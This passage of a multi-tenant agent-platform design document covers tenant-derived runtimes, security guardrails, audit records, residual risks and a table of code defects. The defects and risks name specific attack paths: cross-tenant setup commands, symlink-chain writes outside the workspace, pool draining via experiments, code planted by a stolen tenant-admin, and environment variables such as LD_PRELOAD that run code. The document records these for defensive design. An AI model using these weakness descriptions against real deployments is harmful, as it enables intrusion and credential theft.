A tenant-derived runtime can be a path's target under decision 14. The child runs under T's policy on the owned pool, and its default commands are the tenant admin's. A label edit can add it to a declared path at once, which is the residual that design already states, and the `Warning` above reports it. Sharing never crosses a tenant, because environments are per tenant.

### Per-tenant capability overrides

`runtime-capability-overrides` applies on top of the effective runtime, once `ResolveForTenant` and the `PUT` handler read the tenant view. A tenant can already override `capabilities.interaction` and injection for its own sessions on any runtime, so the prohibition on a derived runtime's `capabilities` does not stop that surface. This design leaves it as it is.

## DR-7: Security oversight and records

**Guardrail.** The SO-2 record gains one constraint:

```json
"derivedRuntimes": { "forbid": ["all"] }
```

The values are `all`, `setupCommands`, `workspaceFiles`, `gitClones`, `floatingCloneRefs`, `writableDefaultClones`, `alwaysWritableClones`, `reservation`, and `reusedPods`. As with the other constraints, the platform grants the class and the tenant's security team can still forbid it. Stopping tenant code takes `setupCommands`, `workspaceFiles`, and `gitClones`, because a file and a clone are code. `verbatimClientFiles: forbid` also forbids `workspaceFiles` and `gitClones`, because each puts arbitrary content in the pod, and a `security-admin` who set it expects that channel closed.

- A violating write answers `422 GUARDRAIL_VIOLATION`.
- `reusedPods` requires `oneSessionPerPod: true` on every derived runtime of the tenant. A runtime holding `false` is non-compliant whatever its template states today, so a create or a `PUT` without the field answers `422 GUARDRAIL_VIOLATION`, and a tightening suspends it until a compliant `PUT`. A row holding `true` takes no widening from a template, so a template write never needs to read this value. The field is one-way, so removing the value leaves it set.
- A tightening sets `suspendedBy` on each non-compliant derived runtime, and a compliant `PUT` clears it, as SO-2's table states for a restored preset. A suspended runtime leaves discovery, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and its pool stops warming and drains. Running sessions continue, under the residual "A stored plan outlives a stop".
- Removing a forbid is a weakening, with SO-2's delay. Creating a derived runtime is not a weakening by itself (decision 9).

**Posture.** A new `derivedRuntimes` section reports each runtime's name, base, `baseStatus`, count and digest of default commands and files, each default clone's URL and ref, whether the ref is a full commit, its `write` value, and whether it is warm, `reservedPods`, `oneSessionPerPod`, the effective `maxConcurrentSessions` and recycling, last writer, and last change. `gates` reports the grant, its limits, and current use. `pools` already reports `ownerTenant`.

**Records.** `admin.runtime.updated` carries `changedFields` alone today. The new events, `admin.derived_runtime.created`, `.updated`, and `.deleted`, carry the owner, the base, the version, the full text of each setup command, each file's path and digest, each default clone's URL, ref, path, `write`, and `warm`, and before and after values for `oneSessionPerPod`, `sessionPolicy`, and the pool's `warmCount` and `reservedPods`. Command text belongs in the record, because it is what ran in every session. File content stays out, because a tenant can place sensitive data there against the documentation, and the composed plan already holds it per session. `derivation-grant` writes and retirement emit their own events. A `platform-admin`'s write to a tenant-derived runtime uses the same route and is mirrored under SO-4a.

## Configuration by scope

| Setting | Description | Scope | Managed by |
| :-- | :-- | :-- | :-- |
| `runtimes.tenantDerivation.enabled` | Whether a new grant or a raise is accepted. False by default. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.maxOwnedPodsTotal` | The limit on the sum of every grant's `maxOwnedPods`. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.baseRetirementNoticeSeconds` | The minimum notice for a retirement. 2592000 by default, which is a judgment. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.maxWorkspaceDefaultsBytes` | The size bound on a derived runtime's default files. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.maxDefaultGitClones` | The limit on a derived runtime's default clones. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.warmClones.maxBytesPerPod` and `totalBytes` | The ceiling on any grant's `maxWarmCloneBytes`, and on the sum across grants of `maxOwnedPods` times that value. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.warmClones.maxAgeSeconds`, `failureThreshold`, and `maxConcurrentFillsPerTenant` | The age limit on an idle pod's store, 86400 by default, the failures before backoff, and the fills one tenant can run at once. These figures are judgments. | Deployment | Platform admin (Helm) |
| `adapter.maxCloneTreeEntries` | The most tree entries the adapter checks out from one plan's clones. The figure is a judgment. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.reservations.enabled` | Whether reservations exist at all. False by default. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.reservations.totalPods` and `reservedRequests` | The reservable pods per resource class, which limits the reserved quota, and the requests set aside from the general quota. | Deployment | Platform admin (Helm) |
| `derivation-grant` (`namePrefix`, `maxRuntimes`, `maxOwnedPods`, and `bases[]` with `allowWorkspaceFiles`, `allowSetupCommands`, `allowGitClones`, `allowGitCloneWrites`, `maxWarmCloneBytes`, `maxReservedPods`, `ownedOverlays`, and `retireAt`) | What the tenant can derive from, under which template, with which defaults and overlays, and up to what limits. | Tenant | Platform admin (admin API) |
| Template pool | The source of every copied pool setting, including `reservedPlacement`. | Pool | Platform admin |
| Derived runtime fields and `pool` block | Under "Fields", "Template copy", and DR-10. | Runtime in a tenant | Tenant admin, or a custom role with `manage_derived_runtimes` |
| `derivedRuntimes` in the security record | What the tenant's security team forbids. | Tenant | `security-admin` |
| Environment selector | Whether an environment admits the runtime. | Environment | Tenant admin |

Every setting in `egress-and-git-design.md` and `tenant-scoping-identity-design.md` stays as written there.

## Scenarios

**An environment's route to one-session pods.** The platform has granted `acme` the base `chat` with template pool `chat-shared`, which serves concurrent sessions. Environment `payments` denies `huggingface.co`, so Bob's create on `chat` in `payments` fails with `ENVIRONMENT_POLICY_NOT_ENFORCEABLE`, and the `Warning` from the policy write named `chat` as affected and as a base with a route. Alice, a `tenant-admin`, posts this:

```yaml
name: acme--chat-payments
baseRuntime: chat
labels: { environment: payments, approved: "false" }
oneSessionPerPod: true
pool: { warmCount: 2, resourceClass: small }
```

The response warns that `payments` admits the runtime. The controller creates two pods from `chat`'s `Runtime` resource, labelled for `acme`. Bob's create succeeds on a one-session pod with `payments`' full policy. The grant sets neither default flag, so no tenant code runs, and this route does not need DR-3.

**Another tenant.** An administrator of `globex` posts `name: acme--x` and gets `422 INVALID_DERIVED_RUNTIME`, and a post under `globex--x` with no grant gets `403 DERIVATION_NOT_GRANTED`. A `globex` user creating a session on `acme--chat-payments` gets the answer for an unknown runtime, and `GET /v1/runtimes` does not list it. A `globex` experiment naming that pool as a variant gets the unknown-pool answer.

**A concurrency value.** The template serves 20 concurrent sessions. Alice sends `sessionPolicy: { maxConcurrentSessions: 5 }` and gets `422 INVALID_DERIVED_RUNTIME`, with `details.field: sessionPolicy.maxConcurrentSessions`. She can set `oneSessionPerPod: true`, and another value takes a template from a `platform-admin`.

**A budget reached.** `acme` holds `maxOwnedPods: 20`, with warm counts summing to 8 and 11 active pods, so T is 19. Bob's claim takes T to 20, which the bound allows. Carol's claim would take it to 21, so it answers `429 QUOTA_EXCEEDED`, though warm pods sit idle. With those 12 active pods, a write taking the warm sum from 8 to 9 answers `422 DERIVATION_BUDGET_EXCEEDED`, with the current use. A write lowering the sum passes.

**A base retired.** An operator retires `chat` with 30 days' notice. `acme`'s audit chain and SIEM destination receive `runtime.base_changed`, and `GET` shows `baseStatus: retiring`. Sessions continue. After the date, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, the owned pool drains, and running sessions finish under their limits. Alice has moved `payments` to another base by then.

**A default clone.** The grant sets `allowGitClones`. Alice adds `github.com/acme/agent-skills` at `main`, under a `required` pool, and the write warns that the ref floats and that repository access now decides who can use the runtime. Bob holds a link and read access, so his session binds the commit `main` names at that moment, and his plan records it. Carol has a link and no access, so her create answers `USER_REPOSITORY_ACCESS_DENIED` with `details.source: runtimeDefault` and `path: skills`, no repository name, and no pod claimed. Dave has no link and gets `USER_LINK_REQUIRED`. A later push to `main` reaches new sessions with no write at Lenny, so `acme`'s `security-admin` sets `floatingCloneRefs` in `forbid`, and the runtime is suspended until Alice pins a commit.

**A warm, writable clone.** The grant sets `allowGitClones` and `maxWarmCloneBytes: 10Gi`. Alice adds `github.com/acme/monorepo` at `main`, with `warm: true` and `write: clientOptIn`, at `src`. Each warm pod fills a store before it reports ready. Bob's client sends `writeDefaultClones: true` without knowing the repository's name, and his session binds the commit `main` names, fetches the few commits the store lacks, and checks them out at `src`. Bob holds read access and no write access, so his session runs read-only and the response lists `src` under `readOnlyDefaultClones`. Carol holds both and pushes her branch. A week later Alice removes the clone, the next claim refuses any pod still holding that store, and the idle pods drain.

**A reservation.** The operator sets `reservations.enabled` and `totalPods: { small: 100 }`, with `reservedPlacement` on the template. A platform admin gives `acme` `maxOwnedPods: 20` and `maxReservedPods: { small: 10 }`. Alice sets `reservedPods: 10` and `warmCount: 2` on `acme--chat-payments`, which takes T to 12, so 10 warm pods start on the dedicated nodes. A burst on other pools fills `lenny-agent-quota` and its own nodes, and `acme`'s pods are unaffected. With all 10 in use, two more warm pods start under the general quota if it has room, and further claims can take the tenant to 20 pods. An administrator of `globex` with no allowance who sets `reservedPods` gets `422 DERIVATION_BUDGET_EXCEEDED`.

**A stolen `tenant-admin`.** A grant with no default flag refuses the attacker's default file, command, and clone. Under a grant with `allowWorkspaceFiles`, the attacker writes a `requirements.txt` that a base command installs, or a hook the runtime loads, and that code runs at the agent UID in each new session. It can read a `file` token and use an `inject` token. The audit event carries the file's path and digest, and an SO-3 destination receives it at once. `derivedRuntimes.forbid` with `workspaceFiles`, `setupCommands`, and `gitClones` refuses the write. Otherwise an operator sets the flag false, which makes the runtime `incompatible` for new sessions, or a `security-admin` adds the forbid. The composed plan on each session row records which sessions ran it.

## Residual risks

- **A tenant admin's reach.** A `tenant-admin` can write defaults that run in every session on a derived runtime, including in an environment it does not belong to, because `tenant-scoping-identity-design.md` already leaves it able to add itself as a member. Environments give no boundary against a tenant admin. No control bounds what a default file does once a base command or the runtime reads it, and commands within an allowlist can still do what the allowed tools do.
- **No per-session consent.** A user selecting a runtime receives its defaults. The plan on `GET /v1/sessions/{id}` shows them after the fact.
- **Shared capacity.** Budgets bound what a tenant holds, and only DR-10 sets a floor. Tenant-owned pods with no reservation share nodes and the namespace `ResourceQuota` with every other pool, and a quota reached by any pods stops pods of all pools, which is true of session load today. A `maxOwnedPodsTotal` set below the quota limits this for owned pools alone. The bound is a pod count, so a tenant using `large` holds more than one using `small`.
- **Pod-count overshoot.** The creation rule reads a cached list and the controller reconciles pools concurrently, so pods can pass `maxOwnedPods` by a small number until the next reconcile.
- **A busy reservation at its bound.** Pods that are draining count toward `maxOwnedPods` at creation, so a pool whose short sessions keep pods draining can fall below its floor when the tenant is at the bound. An operator gives headroom by setting `maxOwnedPods` above the reservation by what its drains need. `TenantReservationUnmet` reports the shortfall. Real drain durations were not measured.
- **Reads a user did not ask for.** Under a `required` pool, a default clone reads a repository the session user can read, on the authority of that user's link, which a tenant admin chose and the user did not name. The user's choice of runtime is the only consent, and the plan shows it after the fact. A default command or base command can then send that content wherever the session's egress allows.
- **Pushers run code.** Whoever can push to a default clone's floating ref runs code in every new session on the runtime, as DR-9 states, until a forbid or a pinned commit applies.
- **Push access with no client statement.** Under `write: always`, every session on the runtime can push within the clone's ref namespace, including a session whose client does not know the repository exists and an agent under prompt injection. The grant flag, the forbid, and the namespace bound this, and branch protection on the host remains the tenant's control.
- **A warm store outlives a host-side revocation.** A repository whose host access ends stays readable on idle pods until `warmClones.maxAgeSeconds`, for a session whose bind checks still pass, because a commit the store holds needs no fetch. On a `required` pool each user's own check still runs. A running session keeps its store when a clone is removed.
- **A new clone can stop a resume.** A tenant admin adding a warm clone refuses the resume of a running user's session when that user cannot read the repository, because the session's next pod holds the store.
- **Disk pressure.** A warm pod within its storage request ranks after pods with no request for kubelet eviction. Agent pods carry no storage request today, so another tenant's pod can go first. The ranking was read from upstream, and that a zero request counts as exceeded is from memory. A storage request on every slot volume, which the egress design's proposal 2 could add with its `sizeLimit`, would remove this. `sizeLimit` counts bytes, so a tree within `adapter.maxCloneTreeEntries` can still use many inodes on a node, and that eviction signal is also from memory.
- **A resume under `reusedPods`.** A session that began before the forbid can resume on a suspended runtime's pod, joining or taking a pod another user of the tenant held, because `resumeOnPod` skips the tenant view. The session already ran under that policy, and it stays within the tenant. A `PUT` setting `oneSessionPerPod: true` ends this, and refusing the resume would strand the session instead.
- **Writable clones on reused pods.** A tenant whose derived runtime reuses pods cannot give a default clone a `write` value until it sets `oneSessionPerPod: true`, and a client declares a repository to push to it. A pool that has held such a clone cannot widen later, so a tenant creates a new runtime for that.
- **A removed repository on reused pods.** As "Who reaches a store" states, a store stays readable to new sessions on a running or held pod until the pod retires.
- **A default clone can lock users out.** A repository removed from the allowlist or a revoked permission refuses new sessions on the runtime for the users affected.
- **Reserved capacity with shared nodes.** Without `reservedPlacement`, a replacement for a reserved pod competes for free node capacity, so a full cluster delays it, and the alert reports it.
- **A listed overlay row.** A stolen `tenant-admin` with `caBundle` listed can read what tools send to hosts `netagent` does not terminate, on pods created afterwards, including a `file` token that opens systems outside the tenant. Other tenants' pods and platform services do not trust that CA. `egress-and-git-design.md` states the LLM reservation's limit on an `internet` pool, and an `internet` listing lets raw traffic leave from a shared address with no decision.
- **Warm pods after an overlay row drops.** No pod roll is triggered, so warm pods carrying a dropped `caBundle` or `clientProfile` serve new sessions until they are used up.
- **Deleting a base's `Runtime` resource.** The RuntimeReconciler's finalizer soft-deletes the row and bypasses notice and the dependents check. An operator who deletes the resource directly strands tenant-derived runtimes at once, as `retired`.
- **A stored plan outlives a stop.** A grant flag set false, a forbid, or a suspension stops new sessions. §7.3 step 3e rebuilds a session with no checkpoint from its stored plan and runs the plan's setup commands, so an attacker's default runs again in that session. An emergency retirement with `force: true` ends such sessions. Filtering on rebuild would need a per-command source on the stored plan, and that is additive. A writable entry a default clone added also stays in the stored plan until the session ends.
- **Trust in the base.** A tenant takes base changes with no approval step, apart from narrowing. A base's `workspaceDefaults` change reaches the tenant's new sessions at once, and a template widening reaches its owned pools in the same transaction. Posture and `runtime.base_changed` report it after the fact.
- **The retirement window.** A base can stay usable for its notice period. A compromised image needs the emergency path, which interrupts tenants.
- **Environment membership through labels.** A runtime enters a selector by inherited labels at create, and a label edit or a base label change alters membership at once. The `Warning` reports it to the writer. A platform's base label edit reaches tenants with only the base-changed event.
- **A compromised gateway replica.** Row-level security limits a tenant-context query. A compromised replica can set any context, write any row, and write any pool. The label and pin layers still refuse another tenant at the pod.
- **Defaults hold no secrets.** A tenant admin can write a secret into a default file against the documentation, and every reader of a session's plan then sees it.
- **Prompt injection inside a tenant.** An agent discovering a derived runtime reads its `agentInterface` text, which a tenant admin wrote.
- **Unproven.** Nothing here has run. That includes the pod path through `podRuntimeRef`, the `lenny.dev/served` readers, and the merge as an intersection.

## Defects found while verifying

These exist independent of this design. Each is filed in `BUILD-GAPS.md` under the F-id in the "Filed as" column, at the severity proposed here. DF-12 has two entries, because its two parts concern different specification sections. "Read" means the evidence comes from reading the code, and nothing was run.

| ID | Filed as | Severity | Defect | Evidence | Closed by |
| :-- | :-- | :-- | :-- | :-- | :-- |
| DF-1 | F-5.1.26 | Critical | A `tenant-admin` holding a grant on a shared runtime can write fields that reach other tenants, including `workspaceDefaults.setupCommands`, which run in other tenants' sessions and are exempt from `setupCommandPolicy`. | `runtimeManage` in `routes.go`, `requireResourceManage`, `applyRuntimeUpdate`, §14.1 **Runtime workspace defaults.**, §7.5 **Command policy:**, and the RuntimeReconciler's `applyCRDFields`. §10.2's **Runtime and pool scoping clarification** permits this write. F-5.2.67 covers pools alone. Read. | DR-1 |
| DF-2 | F-10.6.25 | High | `runtime_tenant_access` does not gate session creation, discovery, or delegation, and `pool_tenant_access` gates only a pinned pool, so a tenant whose environment selector or `allow-all` admits a runtime uses it with no grant. §10.6's "Runtimes owned by other tenants are never exposed" has no data behind it, and §5.1 **First-Party Reference Runtimes** states "no default tenant access grants". | `tenantReachesRuntime` is called only from the internal metadata route. `requireEnvironmentAdmission`, `filterRuntimesByEnvironment`, and `filterByEnvironmentAccess` read no grant. `tenantaccessstore` has no importer under `mcpfabric`. The comment in `pkg/embedded/stack/runtimes.go` saying `tenantReachesRuntime` denies a session is false. Read. | DR-1 |
| DF-3 | F-5.1.27 | High | A pool on a derived runtime, or on a runtime registered only through the admin API, produces no pods. `createPod` reads a `Runtime` custom resource by name, nothing in the admin path writes one, and the CRD has no `baseRuntime`. This is against §5.1's admin API statement and **Derived Runtime Instantiation**. | `createPod`, `handleCreateRuntime`, `runtime_types.go`. The only writers of `Runtime` resources outside tests are the chart's `reference-runtimes.yaml`, the embedded stack, and the reconciler's patch. Read. | DR-2 closes the derived half through `podRuntimeRef`. The admin-registered standalone half stays open, because no base resource exists to point at. |
| DF-4 | F-7.5.17 | High | Setup commands, a client's included, run at the adapter's UID in the adapter's container on a sidecar pod. That container holds the projected service account token and a writable credential volume, and on a concurrent pod the volume holds every slot's file. §7.5 **Security model:** treats the pod as the boundary, §13.1's adapter-agent boundary is a UID check, and a process a setup command starts can outlive it, as §5.2 **What the scrub reaches.** concedes. The command also runs from the adapter's image, so the `pip install` in §5.1's example does not touch the runtime's environment. `DefaultSetupEnv` sets `USER=agent` and does not change the UID, and the comment on `RunSetup` saying "as the agent user" is false. The rating is a floor: what the projected token can do at the gateway was not traced, and a wider reach there raises it. | `RunSetup` in `staging.go`, `workspace.RunSetup` and `buildSetupCmd`, `sidecar.go` mounts, `sa_token.go`. Read. | DR-3, for the adapter's identity. The concurrent-pod credential read stays, as §13.1 states. |
| DF-5 | F-5.1.28 | Medium | §5.1's fallback to the base runtime's pool does not exist, so a derived runtime with no pool answers `ErrNoMatchingPool`. With DF-3, no derived runtime runs a session today. | `ResolvePool`. No use of `BaseRuntime` in `podsession` or the claim path. Read. | DR-2, by changing §5.1 |
| DF-6 | F-5.1.29 | Medium | A runtime's `sessionPolicy` sets no pod behaviour beyond `maxClientIdleSeconds`, though §5.1's example and merge table imply it does. `tenant-scoping-identity-design.md`'s route rests on this. | `poolPolicyMirror`, `toConfig`, `sessionidle.go`, `envelope.go`. Read. | DR-2 |
| DF-7 | F-5.1.30 | Medium | A derived runtime can widen `setupCommandPolicy` and replace `delegationPolicyRef`, because `validateDerivedRuntime` checks neither and `Merge` replaces both. §5.1 says restrict, §8.3 says **Effective policy = `base_policy ∩ derived_policy`**, and `docs/getting-started/concepts.md` says restrict-only. | `validateDerivedRuntime`, `validateDerivedRuntimeUpdate`, `Merge`. Read. | DR-4 for tenant-derived, DR-2 for the rest |
| DF-8 | F-15.1.75 | Medium | `DELETE /v1/admin/runtimes/{name}` checks no pool or session, against §15.1's **Deletion semantics** Runtime rule. A derived runtime on a soft-deleted base still resolves as active, because `Get` returns soft-deleted rows and `Merge` clones the derived row. | `handleDeleteRuntime`, `pgstore.Get`, `Merge`. Read. | DR-6 |
| DF-9 | F-10.7.22 | High | Any `tenant-admin` can drain any pool in the deployment and delete its `SandboxWarmPool`, by naming it as an experiment variant. The controller reads every tenant's experiments and applies effects to any named pool: `paused` sets `ForceZeroMinWarm`, `concluded` sets `DrainAndDelete`, `InitialMinWarm` overwrites `MinWarm`, and `SumActiveVariantWeights` reduces the sole pool warming the base. Variant pools have no `pool_tenant_access` check, and `variant.Runtime` has no grant check, at write or at routing. Two tenants naming one pool make `ResolveVariantRoles` return an error, which stops the adjustment for every tenant. | `ExperimentVariantSource.ListPoolConfigs`, `ResolveVariantRoles`, and `drainAndDeleteWarmPool` in `pkg/controller/poolscaling`. `requireTenantResourceAdmin` on the experiment routes, with `PATCH` accepting `concluded`. `checkVariantIsolation` skips what it cannot resolve. `ApplyExperimentRouting` sets `row.RuntimeRef` from `variant.Runtime`, which steers the claim. It also sets `row.PoolRef` from `variant.Pool`, and `claimForNewRow` overwrites that, so `variant.Pool` does not steer an exclusive claim. Read. | DR-1 |
| DF-10 | F-5.1.31 | Low | A runtime name can be 128 characters, and `createPod` copies it to a pod label, whose value Kubernetes limits to 63. | `namePattern`, `pod.Labels[state.LabelRuntime]`. Read. | DR-1 |
| DF-11 | F-5.2.68 | Low | §5.2 **Pool Taxonomy** describes cold pools with `minWarm` 0 and `maxWarm` above 0, and `PoolStoreSource` maps both from `warmCount`, so a pool at 0 has no pods. | `toConfig`. Read. | Not in this design. It sets the 1-pod minimum, and a fix relaxes that. |
| DF-12 | F-5.1.32 for the merge table, F-10.2.43 for the quota row | Low | §5.1's merge table omits `workspaceTier`, `sdkWarmBlockingPaths`, `archivePolicy`, `toolCapabilityOverrides`, and `description`. A derived payload's `sdkWarmBlockingPaths` is accepted and discarded. §10.2's matrix gives `tenant-admin` "Manage quotas", and the tenant update route that holds `max_concurrent_sessions` uses `requireAdmin`. | `RuntimePayload`, `Merge`, `routes.go`. Read. | DR-4 for the table. The quota row is not in this design. |
| DF-13 | F-8.3.13 | Medium | The delegation policy deletion guard ignores the tenant. Policies are keyed on `(tenant_id, name)`, and `delegationPolicyRuntimeDependents` takes a name alone, so a platform runtime referencing `strict` blocks every tenant's delete of its own `strict`, and the answer names that runtime to a tenant with no grant on it. | `delegationPolicyRuntimeDependents`, `handleDeleteDelegationPolicy`, which a `tenant-admin` reaches and which runs the guard before reading the policy, and migration `0054`. Read. | DR-4 |
| DF-14 | F-17.6.27 | Medium | §17.6 states that a seeded runtime or pool can carry `tenantAccess`, and nothing implements it. `BootstrapRequest` has no such field, and neither bootstrap handler makes a grant call. A seed therefore holds no access rows. That is harmless while DF-2 stands, and it stops every session once DF-2 closes. | `BootstrapRequest`, `bootstrap.go`, `bootstrap_resources.go`, and `tests/testinfra/kind/install.sh`. `pkg/embedded/stack/runtimes.go` grants runtimes alone. Read. | DR-1 |
| DF-16 | F-8.7.16 | High | A delegated child's exports reach an operator's setup command at the adapter's identity on a target with no runtime supervisor, so a prompt-injected parent can run code with the service account token. |
| DF-17 | F-5.2.69 | Medium | A pool can set `maxConcurrentSessions` above 1 on any runtime, because no runtime declares whether it can serve concurrent sessions. The owner chose `capabilities.maxConcurrentSessions` on the runtime, defaulting to 1. | `RuntimeCapabilities`, `ValidateSessionPolicy`, and `ValidatePreConnectExecutionMode`. Read. | Not in this design. An owned pool that keeps its template's value stays within the runtime's value, because the template passed the check, and `oneSessionPerPod` is unaffected. |
| DF-15 | F-13.4.24 | High | The adapter's materializer follows symbolic links in a restored tree. `extractSymlink` and `ValidateSymlinkTarget` check the target lexically, so a chained link passes both and resolves outside the workspace or into `/run/lenny`, and `writeInlineFile`, `writeUploadFile`, `makeDir`, and `overlayTree` write through it at the adapter's UID. An agent can plant the chain, `ArchiveTree` records it, and a derive restores it ahead of the plan's sources. | `extract.go`, `upload.go`, `materialize.go`, `tree.go`. `scrub/resolve_linux.go` shows the safe form. Read. | Its own proposal, or EG's proposal 3. |

F-5.2.67 (High) stands for pools, and this design adds that the same gate covers `runtimeRef`, `isolationProfile`, `sessionPolicy`, warm count, and `drain`. DR-1 refuses all of them to `tenant-admin` on a shared pool. EG-9's tenant pool overlay remains the path for egress and git settings.

## Changes requested of other design documents

Revision 8 applied these edits to the documents named, which now carry them at the revisions cited in the status line. The table remains as the record of why each was made.

| Document | Request | Why |
| :-- | :-- | :-- |
| `tenant-scoping-identity-design.md` | Under "Pods with no per-session policy", and in the "A concurrent pool" scenario and decision 15's cost: replace "a derived runtime with `sessionPolicy.maxConcurrentSessions: 1`" with a derived runtime and its owned pool under `oneSessionPerPod: true`, under a grant, and replace "a `platform-admin` creates" with a `tenant-admin` holding a grant. | DF-6 makes the current sentence false, and the route changes hands. |
| The same | Under "Residual risks", **Label edits on a sharing path**: name `PUT /v1/admin/derived-runtimes/{name}` alongside the route it names, and note that DR-1 removes a `tenant-admin` from the existing route. | The route changes. |
| The same | Under "Fail closed" in TS-3: no change to the rule. Add DR-8 to the readers of `runtimeAuthorizedForCaller`'s gate, in the dependency notes. | DR-8 depends on it. |
| The same | Under "A session's environment", add a tenant-view miss on any name to the runtime-dependent checks that run again on the final row, for an experiment or `PreRoute` rewrite and for a delegated child. | The rewrite happens after admission. |
| `egress-and-git-design.md` | Under "Scopes and who manages them", replace "Tenant admins cannot create runtimes or pools" with the grant's rule, and add `tenantDerivedRuntimes` to the gates row and to EG-9's write path. | It becomes false once DR-4 and DR-5 land. |
| The same | "Pod models", the "Tenant-owned pool" row: state that a label stamped at creation conflicts with `AdmitTenantPin` and with **Pinned idle inventory**, and adopt `lenny.dev/served`. | It is a shipped enforcement point, and an owned non-recycling pool drains its own pods without this. It belongs with `ownerTenantId` in EG-9. |
| The same | State who sets the ceiling, warm-up policy, and `tenantEgressProfiles` on a tenant-created pool: a template pool's values, copied. State that `ownerTenantId` has no proposal in `proposals/`, because draft 0111 is not there. | That design assumes a platform admin wrote each pool. |
| The same | Under "Reserved for other designs", add `owner_tenant_id`, `template_pool`, and `pod_runtime_ref` on the pool row. | Stored format. |
| The same | Under "Tenant pool overlays", for a pool a grant entry names and for its owned pools: a write lowering a `tenantOverride` flag succeeds, the extending part of any tenant's overlay stops applying, and `runtime.base_changed` goes out. The owned-only rows read as `none` unless the grant entry lists them. | The current refusal lets an overlay block a platform write, against R6, and a copied flag opens rows the operator did not consider. |
| The same | Under "Client proxy profile", limit a tenant-set environment variable to an allowlist of names the chart ships, the proxy and trust variables. | A proxy profile's variable otherwise sets what the runtime loads, and a denylist stays open: `LD_PRELOAD`, `NODE_OPTIONS`, `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT` all run code. No such rule exists there. |
| `user-git-identity-design.md` | Under "Declared repositories" and "When the check runs": a default clone is a declared source once composed. State that "before any pod claim" does not hold for a plan bound at finalize, because the create-time claim comes first. | DR-9 relies on the first, and the second is what the code does. |
| `egress-and-git-design.md` | State how the adapter clones into a target that already holds files, and that a composed default clone counts as a plan source. | "Not verified" under DR-9. |
| `security-oversight-design.md` | Add `derivedRuntimes` to the SO-2 record, the weakening list, and the "Enforcement" table. Add the `derivedRuntimes` section to "Posture" and the grant to `gates`. State that `verbatimClientFiles: forbid` also forbids `workspaceFiles`. | R7. |

`user-credential-delivery-design.md` needs no edit. Its refusal on `maxConcurrentSessions > 1` reads the owned pool's value as it reads any pool's, and its attacker row for a tenant admin able to change `workspaceDefaults` already states this reach.

## DR-12: Repository folders and the working directory

The owner settled decision 19 with a rule for every session, not only for default clones: every repository goes in its own subfolder of the session's `current/`. A session can then start in a folder the plan names, because a coding agent expects to start inside its repository.

**Repository folders.** Every `gitClone` source, from a client, a runtime's defaults, or a tenant's defaults, names `path`, a relative subdirectory of `current/` that is not `.`. §14's default of `.` goes, and a plan whose clone omits `path` or names `.` answers `400 WORKSPACE_PLAN_INVALID`. Two clones in one plan cannot share a path or sit one inside the other, and composition refuses a client clone that meets a default clone, with `details.source: runtimeDefault` and no URL, as "Binding" states for other refusals a default causes. A file whose path lies inside a clone's folder keeps §14's per-path collision rule, so a plan can still write a file into its repository. The adapter still clones into a new empty directory and moves the result, as "Not verified" states, because an earlier source can have written into the target.

**`workingDirectory`.** The plan gains an optional `workingDirectory`, a relative path under `current/` that defaults to `.`. A runtime's `workspaceDefaults` can set one too, and the plan's value wins, so a client that does not know a default repository's folder still starts in it. The value passes the same path checks as a source `path`, including the `.git` refusal.

- **Start.** After materialization the adapter opens the folder with `openat2` under `RESOLVE_BENEATH | RESOLVE_NO_SYMLINKS`. A missing folder, a file, or a path crossing a symbolic link fails the session with `WORKSPACE_WORKING_DIRECTORY_INVALID` before the runtime starts. The adapter passes the folder as the session's `cwd` on session start, which §7.1 already carries, and §6.4 changes from a runtime deriving `cwd` from the session identifier to a runtime using the `cwd` the adapter names, which always lies under `/workspace/slots/{sessionId}/current/`.
- **Setup commands.** Each `setupCommands` entry gains an optional `cwd`, a relative path under `current/` with the same checks, which defaults to the working directory, and the adapter applies the start check to it before the command runs. A command under `setupCommandPolicy.shell: false` cannot change folder itself, so a tenant default command that needs `current/` sets `cwd: .`.
- **Resume and derive.** The stored plan carries the value, so a derive, retry, rebuild, and resume start in the same folder. An agent can delete or replace the folder during a session, so on a resume or restore a folder that fails the check starts the runtime in `current/` and records `workspace.working_directory_fallback`, rather than failing a session the user did not misconfigure.

**Compatibility.** §14 treats a newly required field as a breaking change that needs a `schemaVersion` bump. No deployment exists, so DR-12 changes `schemaVersion` 1 in place, and §14's rule applies from the first release.

DR-12 changes a wire contract and the stored plan, so it lands before DR-9, and it stands on its own for sessions on every runtime.

## Specification sections affected

- §4.2 **Multi-tenancy:** and the classification table: the tenant-scoped row, and the removal of `tenant-admin` writes on platform-global records.
- §4.6.1 and §4.6.3: the owner label at creation, `podRuntimeRef`, the warm target under a reservation, `spec.reserved`, the rendered bound, `warmClones`, `warmCloneBytes`, `warmStores`, and the `lenny.dev/owner-tenant` Sandbox label.
- §4.7.10 **Runtime supervisor.**: running setup commands at the agent UID, on the existing `CH-SUPERVISE`.
- §5.1 **Inheritance Rules**, **Normative Merge Algorithm**, and **Derived Runtime Instantiation**: the missing rows, the live merge for tenant-derived runtimes, the fallback statement, and what a runtime's `sessionPolicy` does. **Base runtime mutability**: the tenant-derived exception. **`publishedMetadata` Field**: the visibility rule. Name grammar.
- §5.2 **Tenant pinning:**, **Pinned idle inventory.**, and **Pool Taxonomy**: owned pools, `oneSessionPerPod`, and `lenny.dev/served`.
- §7.1: the order of composition and checks, the check ahead of a create-time claim, and `session-derive-design.md` owns **Derive restore semantics:**.
- §14, the `gitClone` and `inlineFile` rows and the schema: `runtimeDefault` as a read-only field, `gitClone.path` required and never `.`, `workingDirectory`, and `setupCommands[].cwd`. §5.1 `workspaceDefaults.workingDirectory`. §6.4 and §7.1: the runtime's `cwd` comes from session start. §15.4's runtime author guide and the §26 reference runtimes read it there. §28: session start carries it. §4.7 and §28: the materialization message carrying it.
- §7.4 and §13.4: every materializer write, move, and removal resolves beneath the workspace with no symbolic links.
- §7.5 **Command policy:** and **Security model:**: the scope of the exemption, and where commands run.
- §8.3: the intersection stated in code terms.
